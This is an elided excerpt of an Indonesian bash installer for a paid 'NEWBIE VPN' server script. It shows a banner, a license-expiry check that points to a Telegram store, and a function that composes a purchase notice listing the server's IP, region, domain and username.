...
clear;clear;clear
  ...
  # // Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  Welcome To NEWBIE VPN Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "     This Will Quick Setup VPN Server On Your Server"
echo -e "         Auther : ${green}NEWBIEVPN ${NC}${YELLOW}(${NC} ${green}KURNIAWAN SETIADI ${NC}${YELLOW})${NC}"
echo -e "       © Recode By Newbie VPN ${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 5
###### IZIN SC 
...
checking_sc() {
  ...
  if [[ $date_list < $useexp ]]; then
    ...
    echo -e "      \033[0;36mTelegram${NC} t.me/newbie_store24"
...
function password_default() {
    ...
    TEXT="Installasi VPN Script Stable V2.1
	◇━━━━━━━━━━━━━━━━━◇
*_PEMBELIAN BERHASIL_*
◇━━━━━━━━━━━━━━━━━◇
-» PRODUK : VPS
-» GARANSI : $certifacate HARI
-» REGION : $CITY ( $ISP )
-» IP SERVER : $MYIP
-» DOMAIN : $domain
-» USER : $Username
...
print_success "UDP-CUSTOM BY NEWBIE"
}
